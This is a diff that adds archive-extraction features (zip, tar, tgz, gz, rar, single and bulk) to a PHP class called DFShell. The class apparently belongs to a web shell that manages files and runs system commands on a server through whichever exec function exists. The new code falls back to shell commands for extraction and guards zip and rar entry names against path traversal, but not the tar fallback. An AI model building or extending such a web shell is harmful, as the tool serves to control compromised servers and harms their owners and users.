@@ -720,6 +720,59 @@ class DFShell{
                             $this->DFSPopupMSG(4,null,"No file deleted!",null,true);
                         }
                     }
+                    // v2.6: bulk extract — unzip each selected archive in-place
+                    if($GLOBALS['DFConfig'][1]['selectAction']==="Unzip"){
+                        if(!empty($GLOBALS['DFConfig'][1]['toZip'])){
+                            $slashtype = $this->DFSSlash();
+                            $extracted = 0; $failed = array();
+                            $compressed_bulk = array('zip','tar','gz','tgz','rar');
+                            foreach($GLOBALS['DFConfig'][1]['toZip'] as $entry){
+                                $parts = explode('||', $entry);
+                                $bdir  = $this->Dec(urldecode($parts[0]));
+                                $bfile = isset($parts[1]) ? $this->Dec(urldecode($parts[1])) : '';
+                                if($bfile==='' || $bfile==='[novalue]'){ $failed[] = basename($bdir).' (dir skipped)'; continue; }
+                                $bext  = strtolower(pathinfo($bfile, PATHINFO_EXTENSION));
+                                if(!in_array($bext, $compressed_bulk)){ $failed[] = $this->DFSH($bfile).' (not an archive)'; continue; }
+                                $pth  = $bdir . $slashtype . $bfile;
+                                $dest = rtrim($bdir, "\\/");
+                                if(!is_dir($dest)){ @mkdir($dest, 0755, true); }
+                                $isTarGz = ($bext==='tgz') || ($bext==='gz' && substr(strtolower($bfile),-7)==='.tar.gz');
+                                $ok = false;
+                                if($bext==='zip'){
+                                    if(class_exists('ZipArchive')){
+                                        $z = new ZipArchive;
+                                        if($z->open($pth)===TRUE){
+                                            $blocked=array();
+                                            for($zi=0;$zi<$z->numFiles;$zi++){
+                                                $nm=$z->getNameIndex($zi);
+                                                if(preg_match('#(^/|^[A-Za-z]:|\.\.)#',$nm)){$blocked[]=$nm;}
+                                            }
+                                            if(!count($blocked)){ $z->extractTo($dest); $z->close(); $ok=true; }
+                                            else { $z->close(); $failed[]=$this->DFSH($bfile).' (ZipSlip blocked)'; continue; }
+                                        }
+                                    } else {
+                                        foreach($GLOBALS['DFSCmd'] as $fn){ if(function_exists($fn)){ @$fn('unzip -o '.escapeshellarg($pth).' -d '.escapeshellarg($dest).' 2>&1'); $ok=true; break; } }
+                                    }
+                                } elseif($bext==='tar' || $isTarGz){
+                                    if(class_exists('PharData')){ try{ (new PharData($pth))->extractTo($dest,null,true); $ok=true; }catch(Exception $e){} }
+                                    if(!$ok){ $flag=$isTarGz?'xzf':'xf'; foreach($GLOBALS['DFSCmd'] as $fn){ if(function_exists($fn)){ @$fn('tar --no-same-owner -'.$flag.' '.escapeshellarg($pth).' -C '.escapeshellarg($dest).' 2>&1'); $ok=true; break; } } }
+                                } elseif($bext==='gz'){
+                                    $out=$dest.$slashtype.basename($bfile,'.gz');
+                                    if(function_exists('gzopen')){ $gz=@gzopen($pth,'rb'); if($gz){ $fp=@fopen($out,'wb'); if($fp){ while(!gzeof($gz)){fwrite($fp,gzread($gz,65536));} fclose($fp); gzclose($gz); $ok=true; } } }
+                                    if(!$ok){ foreach($GLOBALS['DFSCmd'] as $fn){ if(function_exists($fn)){ @$fn('gunzip -c '.escapeshellarg($pth).' > '.escapeshellarg($out).' 2>&1'); $ok=true; break; } } }
+                                } elseif($bext==='rar'){
+                                    if(class_exists('RarArchive')){ $r=@RarArchive::open($pth); if($r){ foreach($r->getEntries() as $re){ $rn=$re->getName(); if(!preg_match('#(^/|^[A-Za-z]:|\.\.)#',$rn)){$re->extract($dest);} } $r->close(); $ok=true; } }
+                                    if(!$ok){ foreach($GLOBALS['DFSCmd'] as $fn){ if(function_exists($fn)){ @$fn('unrar x -o+ '.escapeshellarg($pth).' '.escapeshellarg($dest).' 2>&1'); $ok=true; break; } } }
+                                }
+                                if($ok){ $extracted++; } else { $failed[] = $this->DFSH($bfile); }
+                            }
+                            $msg = "Extracted: $extracted file(s).";
+                            if(count($failed)){ $msg .= " Failed/skipped: ".implode(', ',$failed); }
+                            $this->DFSPopupMSG($extracted>0?3:4, null, $msg, null, true);
+                        } else {
+                            $this->DFSPopupMSG(4, null, "No files selected!", null, true);
+                        }
+                    }
                 }
             break;
             case "zipping":
@@ -1137,40 +1190,172 @@ class DFShell{
                 echo "</section>";
             break;
             case "unzip":
+                // v2.6: multi-format extraction — .zip, .tar, .tar.gz/.tgz, .gz, .rar
                 $from = $this->Dec($GLOBALS['DFConfig'][0]['dfp']);
                 $zipp = $this->Dec($GLOBALS['DFConfig'][0]['dff']);
+                $pth  = $from . $zipp;
+                $ext  = strtolower(pathinfo($zipp, PATHINFO_EXTENSION));
+                // detect .tar.gz / .tgz as a compound type
+                $isTarGz = ($ext === 'tgz') || ($ext === 'gz' && substr(strtolower($zipp), -7) === '.tar.gz');
                 echo "<section id='unzipping'>";
                 if(isset($GLOBALS['DFConfig'][1]['destination'])){
-                    if(!class_exists('ZipArchive')){ $this->DFSPopupMSG(4,null,"ZipArchive not available!",null,false); }
-                    else{
-                        $ziproc = new ZipArchive;
-                        $pth = $from.$zipp;
-                        $dest = rtrim($GLOBALS['DFConfig'][1]['destination'],"\\/");
-                        if(!is_dir($dest)){ @mkdir($dest,0755,true); }
-                        if ($ziproc->open($pth) === TRUE) {
-                            // v2.3: ZipSlip guard — reject entries with .. or absolute paths
-                            $blocked = array();
-                            for($zi=0;$zi<$ziproc->numFiles;$zi++){
-                                $nm = $ziproc->getNameIndex($zi);
-                                if(preg_match('#(^/|^[A-Za-z]:|\.\.)#',$nm)){ $blocked[]=$nm; }
+                    $dest = rtrim($GLOBALS['DFConfig'][1]['destination'], "\\/");
+                    if(!is_dir($dest)){ @mkdir($dest, 0755, true); }
+                    $ok  = false;
+                    $msg = '';
+
+                    if($ext === 'zip'){
+                        // — ZIP via ZipArchive (PHP ext) ——————————————————————————
+                        if(!class_exists('ZipArchive')){
+                            // fallback: shell unzip
+                            $cmd = null;
+                            foreach($GLOBALS['DFSCmd'] as $fn){
+                                if(function_exists($fn)){
+                                    $safeP = escapeshellarg($pth);
+                                    $safeD = escapeshellarg($dest);
+                                    $out = @$fn("unzip -o $safeP -d $safeD 2>&1");
+                                    $ok = true; $msg = is_string($out) ? htmlspecialchars($out,ENT_QUOTES,'UTF-8') : ''; break;
+                                }
                             }
-                            if(count($blocked)){
-                                $ziproc->close();
-                                echo "<p style='color:red'>Blocked ZipSlip entries: ".$this->DFSH(implode(', ',array_slice($blocked,0,5)))."</p>";
-                            }else{
-                                $ziproc->extractTo($dest);
-                                $ziproc->close();
-                                $this->DFSPopupMSG(3,null,"File successfully extracted to destination!",null,false);
-                            }
+                            if(!$ok){ $msg = 'ZipArchive extension not available and no shell access.'; }
                         } else {
-                            $this->DFSPopupMSG(4,null,"Failed to extract into destination!",null,false);
+                            $ziproc = new ZipArchive;
+                            if($ziproc->open($pth) === TRUE){
+                                $blocked = array();
+                                for($zi=0; $zi<$ziproc->numFiles; $zi++){
+                                    $nm = $ziproc->getNameIndex($zi);
+                                    if(preg_match('#(^/|^[A-Za-z]:|\.\.)#', $nm)){ $blocked[] = $nm; }
+                                }
+                                if(count($blocked)){
+                                    $ziproc->close();
+                                    $msg = 'Blocked ZipSlip entries: '.$this->DFSH(implode(', ', array_slice($blocked,0,5)));
+                                } else {
+                                    $ziproc->extractTo($dest);
+                                    $ziproc->close();
+                                    $ok = true;
+                                }
+                            } else { $msg = 'Failed to open ZIP file.'; }
                         }
+
+                    } elseif($ext === 'tar' || $isTarGz){
+                        // — TAR / TAR.GZ / TGZ via PharData (PHP ext) ————————————
+                        $pharOk = false;
+                        if(class_exists('PharData')){
+                            try {
+                                $phar = new PharData($pth);
+                                // PharData::extractTo() rejects .. paths natively
+                                $phar->extractTo($dest, null, true);
+                                $ok = true; $pharOk = true;
+                            } catch(Exception $e){
+                                $msg = 'PharData: '.$this->DFSH($e->getMessage());
+                            }
+                        }
+                        if(!$pharOk){
+                            // fallback: shell tar
+                            $flag = $isTarGz ? 'xzf' : 'xf';
+                            foreach($GLOBALS['DFSCmd'] as $fn){
+                                if(function_exists($fn)){
+                                    $safeP = escapeshellarg($pth);
+                                    $safeD = escapeshellarg($dest);
+                                    $out = @$fn("tar --no-same-owner -$flag $safeP -C $safeD 2>&1");
+                                    $ok = true; $msg = is_string($out) ? htmlspecialchars($out,ENT_QUOTES,'UTF-8') : ''; break;
+                                }
+                            }
+                            if(!$ok && !$pharOk){ $msg = ($msg ?: '') . ' PharData not available and no shell access.'; }
+                        }
+
+                    } elseif($ext === 'gz' && !$isTarGz){
+                        // — plain .gz (single file) via zlib stream ———————————————
+                        $outFile = $dest . DIRECTORY_SEPARATOR . basename($zipp, '.gz');
+                        $gzOk = false;
+                        if(function_exists('gzopen')){
+                            $gz = @gzopen($pth, 'rb');
+                            if($gz){
+                                $fp = @fopen($outFile, 'wb');
+                                if($fp){
+                                    while(!gzeof($gz)){ fwrite($fp, gzread($gz, 65536)); }
+                                    fclose($fp); gzclose($gz);
+                                    $ok = true; $gzOk = true;
+                                } else { $msg = 'Cannot write output file.'; gzclose($gz); }
+                            } else { $msg = 'Cannot open .gz file.'; }
+                        }
+                        if(!$gzOk){
+                            // fallback: shell gunzip -k (keep original)
+                            foreach($GLOBALS['DFSCmd'] as $fn){
+                                if(function_exists($fn)){
+                                    $safeP = escapeshellarg($pth);
+                                    $safeD = escapeshellarg($dest);
+                                    $out = @$fn("gunzip -c $safeP > ".escapeshellarg($outFile)." 2>&1");
+                                    $ok = true; $msg = is_string($out) ? htmlspecialchars($out,ENT_QUOTES,'UTF-8') : ''; break;
+                                }
+                            }
+                            if(!$ok){ $msg = ($msg ?: '') . ' zlib extension not available and no shell access.'; }
+                        }
+
+                    } elseif($ext === 'rar'){
+                        // — RAR via RarArchive (PHP ext) ——————————————————————————
+                        $rarOk = false;
+                        if(class_exists('RarArchive')){
+                            $rar = @RarArchive::open($pth);
+                            if($rar){
+                                $entries = $rar->getEntries();
+                                foreach($entries as $entry){
+                                    // guard against path traversal
+                                    $ename = $entry->getName();
+                                    if(preg_match('#(^/|^[A-Za-z]:|\.\.)#', $ename)){ continue; }
+                                    $entry->extract($dest);
+                                }
+                                $rar->close();
+                                $ok = true; $rarOk = true;
+                            } else { $msg = 'Failed to open RAR file.'; }
+                        }
+                        if(!$rarOk){
+                            // fallback: shell unrar
+                            foreach($GLOBALS['DFSCmd'] as $fn){
+                                if(function_exists($fn)){
+                                    $safeP = escapeshellarg($pth);
+                                    $safeD = escapeshellarg($dest);
+                                    $out = @$fn("unrar x -o+ $safeP $safeD 2>&1");
+                                    // try 7z as second option if unrar isn't there
+                                    if(is_string($out) && stripos($out,'not found') !== false){
+                                        $out = @$fn("7z x $safeP -o$safeD 2>&1");
+                                    }
+                                    $ok = true; $msg = is_string($out) ? htmlspecialchars($out,ENT_QUOTES,'UTF-8') : ''; break;
+                                }
+                            }
+                            if(!$ok){ $msg = ($msg ?: '') . ' RarArchive extension not available and no shell access.'; }
+                        }
+
+                    } else {
+                        $msg = 'Unsupported archive format: '.$this->DFSH($ext);
                     }
-                }else{
-                    echo "<center><font color='white'>Filename : ".$this->DFSH($from.$zipp)."</font>";
-                    echo "<table><form action='' method='POST'><tr><td><label>Destination : </label></td>";
-                    echo "<td><input type='text' name='destination' value='".$this->DFSH(dirname($from.$zipp))."'></td></tr><tr><td></td><td><button>Unzip</button></td>";
-                    echo "</form></table></center>";
+
+                    if($ok){
+                        $extra = $msg ? "<br><pre class='dfs-uz-out'>$msg</pre>" : '';
+                        $this->DFSPopupMSG(3, null, "File successfully extracted to destination!$extra", null, false);
+                    } else {
+                        $this->DFSPopupMSG(4, null, $msg ?: "Extraction failed.", null, false);
+                    }
+
+                } else {
+                    // — show destination form ————————————————————————————————————
+                    $label = strtoupper($ext ?: 'archive');
+                    echo "<center>";
+                    echo "<h3><i class='fa-solid fa-file-zipper' style='color:var(--gold)'></i> Extract Archive</h3>";
+                    echo "<div class='dfs-uz-file'>";
+                    echo "<i class='fa-solid fa-file' style='color:var(--gold)'></i> ".$this->DFSH(basename($pth));
+                    echo " <span class='dfs-uz-badge'>$label</span>";
+                    echo "</div>";
+                    echo "<form action='' method='POST'>";
+                    echo "<table>";
+                    echo "<tr><td><label>Destination&nbsp;:</label></td>";
+                    echo "<td><input type='text' name='destination' value='".$this->DFSH(dirname($pth))."'></td></tr>";
+                    echo "<tr><td colspan='2'><button class='dfs-uz-btn dfs-uz-".strtolower($label)."'>";
+                    echo "<i class='fa-solid fa-file-export'></i> Extract $label";
+                    echo "</button></td></tr>";
+                    echo "</table>";
+                    echo "</form>";
+                    echo "</center>";
                 }
                 echo "</section>";
             break;
@@ -1212,13 +1397,11 @@ class DFShell{
                         $dfp = $this->Enc();
                         $this->string = $p;
                         $dff = $this->Enc();
-                        $compressed = array("zip","tar","gz","rar");
-                        $isZip = pathinfo($p,PATHINFO_EXTENSION);
+                        $compressed = array("zip","tar","gz","tgz","rar");
+                        $isZip = strtolower(pathinfo($p, PATHINFO_EXTENSION));
                         $safeP = $this->DFSH($p);
-                        if(in_array(strtolower($isZip),$compressed)){
-                            $tname = $safeP . "<button style='border-radius:8px;background:orange;'>
-                            <a style='color:black;' href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=unzip'>
-                             UNZIP </a></button>";
+                        if(in_array($isZip, $compressed)){
+                            $tname = $safeP;
                         }else{
                             $tname = $safeP;
                         }
@@ -1236,7 +1419,9 @@ class DFShell{
                         <a title='Move' href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=move'><i class='fa-solid fa-arrows-up-down-left-right'></i></a> .
                         <a title='Info' href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=info'><i class='fa-solid fa-circle-info'></i></a> .
                         <a title='Delete' href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=del'><i class='fa-solid fa-trash'></i></a> . 
-                        <a title='Download' href='?dfp=".urlencode($dfp)."&dfd=".urlencode($dff)."&dfaction=download'><i class='fa-solid fa-download'></i></a></td></tr></p>";
+                        <a title='Download' href='?dfp=".urlencode($dfp)."&dfd=".urlencode($dff)."&dfaction=download'><i class='fa-solid fa-download'></i></a>"
+                        .(in_array($isZip,$compressed) ? " . <a title='Extract' href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=unzip' style='color:var(--green)'><i class='fa-solid fa-file-zipper'></i></a>" : "")
+                        ."</td></tr></p>";
                     }
                 }
                 echo "</table>
@@ -1245,6 +1430,7 @@ class DFShell{
                 <select name='selectAction'>
                 <option value=''>-- Action --</option>
                 <option value='Zip'>-- Zip --</option>
+                <option value='Unzip'>-- Unzip --</option>
                 <option value='Delete'>-- Delete --</option>
                 </select>
                 <input type='submit' value='Submit'>
